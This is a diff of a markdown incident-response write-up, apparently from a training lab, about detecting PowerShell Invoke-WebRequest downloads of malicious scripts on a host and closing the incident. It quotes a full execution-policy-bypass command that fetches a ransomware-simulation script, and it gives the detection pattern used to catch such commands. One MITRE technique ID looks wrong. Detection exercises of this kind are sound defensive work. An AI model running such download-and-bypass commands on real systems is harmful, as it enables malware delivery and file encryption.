@@ -14,7 +14,7 @@
 
 ### **Detection and Analysis**
 
-- An alert was defined to trigger for suspicious web requests executed from PowerShell scripts on the virtual host machine `win-vm-mde`. The `DeviceProcessEvents` table was used to uncover more information regarding the incident.
+- An alert was defined to trigger on suspicious web requests executed via PowerShell scripts on the virtual host machine `win-vm-mde`. The `DeviceProcessEvents` table was used to gather more information regarding the incident.
 
 ![image](https://github.com/user-attachments/assets/dc3f7fe7-71f8-4244-a3d2-af9cd2b3ef59)
 
@@ -22,17 +22,17 @@
 
 <img width="1440" alt="Screenshot 2025-06-13 004249" src="https://github.com/user-attachments/assets/059f7db2-73a4-48b8-aa08-c619a7510df6" />
 
-- There were 5 processes that were created in which PowerShell was used to run a command that contained `Invoke-WebRequest`. It is safe to assume that this command is pulling from an external URL to download and potentially run a script. 
+- Five processes were identified where PowerShell was used to run commands that contained `Invoke-WebRequest`. It is safe to assume that these commands were pulling data from external URLs to download and potentially execute scripts. 
 
 
 
-- A rule was created to monitor any suspiciously created web request. Specifically, the rule was to detect any processes that included `Invoke-WebRequest` as one of its commands. This command is common to download files or scripts from websites or servers on the internet. This would evade traditional defence solutions as these solutions may not be configured to detect these types of commands from PowerShell that is ran on the host machine.
+- A detection rule was created to monitor any suspiciously created web requests. Specifically, the rule was to detect any processes that included `Invoke-WebRequest` as part of their command line. This command is commonly used to download files or scripts from websites or servers on the internet. This would evade traditional defence solutions, as these solutions may not be configured to detect PowerShell commands executed on the host machine.
 
 <img width="727" alt="Pasted image 20250612195543" src="https://github.com/user-attachments/assets/daf7a2c6-10c8-4506-81d1-cafe2dea76f0" />
 
 
 - The appropriate Tactics, Techniques and Procedures (TTPs) from the MITRE ATT&CK Framework were selected for this detection rule.
-  - Credential Access (TA0002)
+  - Execution (TA0002)
     - Command and Scripting Interpreter (T1059)
       - PowerShell (T1059.001)
     - Exploitation for Client Execution (T1023)
@@ -53,12 +53,12 @@
 
 ![image](https://github.com/user-attachments/assets/61e1553f-5790-4b01-aa4d-ef605a3a8613)
 
-Another query will be executed against the data in the Log Analytics workspace to log the account `win-vm-mde` and the device name to see if a user has been invoking malicious PowerShell commands such as `Invoke-WebRequest`.
+Another query was executed against the data in the Log Analytics workspace to log the account `win-vm-mde` and the device name to determine if a user has been invoking malicious PowerShell commands such as `Invoke-WebRequest`.
 
 
 ![image](https://github.com/user-attachments/assets/948e20eb-be81-4d74-988e-39b82bcd0f32)
 
-After the rule was created, we see five entities: the host machine `win-vm-mde` and the 4 different PowerShell commands that were executed.
+After the rule was created, five entities were identified: the host machine `win-vm-mde` and four different PowerShell commands that were executed.
 
 
 <img width="1521" alt="Screenshot 2025-06-12 203510" src="https://github.com/user-attachments/assets/ddf32244-2289-4812-86a3-2c030fdaa875" />
@@ -72,7 +72,7 @@ After the rule was created, we see five entities: the host machine `win-vm-mde` 
 ![image](https://github.com/user-attachments/assets/8c279499-9b01-4a37-83e8-18bef1064964)
 
 
-Upon investigating the triggered incident `Alert PowerShell Suspicious Web Request Rule`, 4 different script commands were found.
+Upon investigating the triggered incident `Alert PowerShell Suspicious Web Request Rule`, four different script commands were found.
 
 `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
 
@@ -87,13 +87,13 @@ Upon investigating the triggered incident `Alert PowerShell Suspicious Web Reque
 
 
 
- It is known at this point that the scripts were downloaded but it was not confirmed if they were executed. Another query was run.
+At this point, it was confirmed that the scripts were downloaded, but it was not yet confirmed if they were executed. A follow-up query was run.
 
 
 
 ![image](https://github.com/user-attachments/assets/4adb0e5b-62cd-473a-95e0-616095f5e3f3)
 
-It was determined that the user `ylavnu` downloaded 4 different malicious PowerShell scripts with 4 different commands on the host machine `win-vm-mde`. The scripts were then passed off to the malware reverse engineering team. Here are the short descriptions for each script:
+It was determined that the user `ylavnu` downloaded four different malicious PowerShell scripts with four distinct commands on the host machine `win-vm-mde`. The scripts were then passed off to the malware reverse engineering team. Below are brief descriptions of each script:
 
 **portscan.ps1**: Scans a specified range of IP addresses for open ports from a list of common ports and logs the results.
 
@@ -104,7 +104,7 @@ It was determined that the user `ylavnu` downloaded 4 different malicious PowerS
 **pwncrypt.ps1**: Encrypts files in a selected user's desktop folder, simulating ransomware activity and creates a ransom note with decryption instructions.
 
 
-The forensics team confirmed that the user `ylavnu` ran the malicious PowerShell script on their machine.
+The forensics team confirmed that the user `ylavnu` ran the malicious PowerShell scripts on their machine.
 
 <img width="611" alt="Pasted image 20250612203238" src="https://github.com/user-attachments/assets/de8de915-a4d4-44ac-905c-968c892931c5" />
 
@@ -123,10 +123,9 @@ The forensics team confirmed that the user `ylavnu` ran the malicious PowerShell
 
 ### **Closure**
 
-The incident response team has reviewed and confirmed the resolution of the event. All containment and remediation steps have been completed, and relevant findings have been documented. This incident has been classified as a `True Positive – Suspicious Activity`. A brute force attack was detected targeting the `win-vm-mde` host. However, all attempts were unsuccessful, and no unauthorised access was achieved.
+The user `ylavnu` was required to complete additional rounds of cybersecurity awareness training. The training package from KnowBe4 was upgraded, and the training frequency was increased. Additionally, a policy was implemented to restrict the use of PowerShell for non-essential users. 
 
-
-Ordered the affected user go through extra rounds of cybersecurity awareness training and upgraded the training package from KnowBe4 and increased frequency. Also implemented a policy that restricts the use of PowerShell for non-essential users. This incident has been classified as a `True Positive - Suspicious Activity`. The user `ylavnu` downloaded 4 malicious PowerShell scripts from an external URL and executed them in the network environment. However, it was discovered that the user misjudged the contents and effects of the scripts and claimed it was an accident. No further suspected damage or persistence was recognised. 
+This incident has been classified as a `True Positive - Suspicious Activity`. The user `ylavnu` downloaded and executed four malicious PowerShell scripts from an external URL within the network environment. However, it was determined that the user misjudged the contents and potential impact of the scripts and claimed their actions were accidental. No further suspected damage or persistence was detected. 
 
 
 
